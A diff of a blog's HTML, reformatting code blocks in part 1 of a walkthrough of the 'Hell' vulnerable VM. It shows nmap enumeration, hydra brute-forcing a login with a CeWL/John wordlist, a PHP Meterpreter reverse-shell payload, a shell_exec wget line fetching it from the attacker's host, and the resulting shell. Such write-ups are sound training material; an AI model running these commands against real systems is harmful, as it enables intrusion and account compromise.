@@ -99,23 +99,40 @@
 
 <p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# nmap -sS -T4 &ndash;script banner 192.168.0.103</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 19:39 BST
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.103
+</span><span class='line'>Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">996</span> closed ports
+</span><span class='line'>PORT    STATE SERVICE
+</span><span class='line'>22/tcp  open  ssh
+</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
+</span><span class='line'>80/tcp  open  http
+</span><span class='line'>111/tcp open  rpcbind
+</span><span class='line'>666/tcp open  doom
+</span><span class='line'><span class="p">|</span>_banner: Welcome to the Admin Panel
+</span><span class='line'>MAC Address: 08:00:27:FF:3F:A0 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 5.20 seconds
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 19:39 BST
-Nmap scan report for 192.168.0.103
-Host is up (0.00012s latency).
-Not shown: 996 closed ports
-PORT    STATE SERVICE
-22/tcp  open  ssh
-|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
-80/tcp  open  http
-111/tcp open  rpcbind
-666/tcp open  doom
-|</em>banner: Welcome to the Admin Panel
-MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
-
-<p>Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds
-[/plain]</p>
 
 <p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>
 
@@ -141,30 +158,55 @@ MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
 
 <p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
-CeWL 5.0 Robin Wood (<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#x67;&#x69;&#x6e;&#105;&#x6e;&#x6a;&#x61;&#x2e;&#x6f;&#x72;&#x67;">&#x72;&#x6f;&#x62;&#x69;&#x6e;&#64;&#100;&#105;&#x67;&#x69;&#110;&#105;&#110;&#x6a;&#x61;&#x2e;&#x6f;&#114;&#103;</a>) (www.digininja.org)</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# cewl http://192.168.0.103/personal/ -d <span class="m">1</span> -m <span class="m">6</span> -w password_list.txt -v
+</span><span class='line'>CeWL 5.0 Robin Wood <span class="o">(</span>robin@digininja.org<span class="o">)</span> <span class="o">(</span>www.digininja.org<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Starting at http://192.168.0.103/personal/
+</span><span class='line'>Visiting: http://192.168.0.103/personal/, got response code 200
+</span><span class='line'>Attribute text found:
+</span><span class='line'>
+</span><span class='line'>Words found
+</span><span class='line'>
+</span><span class='line'>root@pwk:~# john --wordlist<span class="o">=</span>password_list.txt --rules --stdout &gt; password_list-mutated.txt
+</span><span class='line'>words: <span class="m">4251</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Thu Jul <span class="m">17</span> 20:08:13 2014<span class="o">)</span>  w/s: <span class="m">47233</span>  current: forever99
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
-Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
-Attribute text found:</p>
-
-<p>Words found</p>
-
-<p>root@pwk:~# john &ndash;wordlist=password_list.txt &ndash;rules &ndash;stdout > password_list-mutated.txt
-words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99[/plain]</p>
 
 <p>Now we have a password list, we can use hydra to brute force the login.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# hydra 192.168.0.103 http-form-post &ldquo;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&rdquo; -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
-Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# hydra 192.168.0.103 http-form-post <span class="s2">&quot;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&quot;</span> -l jack -P password_list-mutated.txt -t <span class="m">20</span> -w <span class="m">1</span> -o hydra-http-post-attack.txt
+</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span><span class="m">2013</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for</span> legal purposes only
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>WARNING<span class="o">]</span> the waittime you <span class="nb">set </span>is low, this can result in errornous results
+</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-07-17 20:10:12
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> <span class="m">20</span> tasks, <span class="m">1</span> server, <span class="m">4251</span> login tries <span class="o">(</span>l:1/p:4251<span class="o">)</span>, ~212 tries per task
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
+</span><span class='line'><span class="o">[</span>80<span class="o">][</span>www-form<span class="o">]</span> host: 192.168.0.103   login: jack   password: g0tmi1k69
+</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-07-17 20:10:22
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[WARNING] the waittime you set is low, this can result in errornous results
-Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-07-17 20:10:12
-[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
-[DATA] attacking service http-post-form on port 80
-[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
-1 of 1 target successfully completed, 1 valid password found
-Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-07-17 20:10:22[/plain]</p>
 
 <p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>
 
@@ -193,25 +235,44 @@ Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temp
 
 <p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.110 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> R &gt; sneaky.txt
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]msf > use multi/handler
-msf exploit(handler) > set payload php/meterpreter/reverse_tcp
-payload => php/meterpreter/reverse_tcp
-msf exploit(handler) > set lport 443
-lport => 443
-msf exploit(handler) > set lhost 192.168.0.110
-lhost => 192.168.0.110
-msf exploit(handler) > run</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; use multi/handler
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload php/meterpreter/reverse_tcp
+</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; php/meterpreter/reverse_tcp
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
+</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
+</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:443
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[<em>] Started reverse handler on 192.168.0.110:443
-[</em>] Starting the payload handler&hellip;[/plain]</p>
 
 <p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]&lt;?php echo shell_exec(&lsquo;wget <a href="http://192.168.0.110/sneaky.txt">http://192.168.0.110/sneaky.txt</a> -O /tmp/sneaky.txt 2>&amp;1&rsquo;);?>[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="s1">&#39;wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span>?&gt;
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>
 
@@ -227,23 +288,39 @@ msf exploit(handler) > run</p>
 
 <p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>
 
-<p>[plain gutter=&ldquo;false&rdquo;][<em>] Sending stage (40551 bytes) to 192.168.0.103
-[</em>] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">40551</span> bytes<span class="o">)</span> to 192.168.0.103
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:443 -&gt; 192.168.0.103:48153<span class="o">)</span> at 2014-07-17 21:55:37 +0100
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt;
+</span></code></pre></td></tr></table></div></figure>
 
-<p>meterpreter >[/plain]</p>
 
 <p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>
 
 <p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]meterpreter > shell
-Process 10279 created.
-Channel 0 created.
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
-$ id
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ [/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>meterpreter &gt; shell
+</span><span class='line'>Process <span class="m">10279</span> created.
+</span><span class='line'>Channel <span class="m">0</span> created.
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>BAM ! We&rsquo;ve just started the journey. Now onto <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2">Part 2</a> - which involves further enumeration, and some hopping between users. You&rsquo;re in for a long long ride.</p>
 </div>
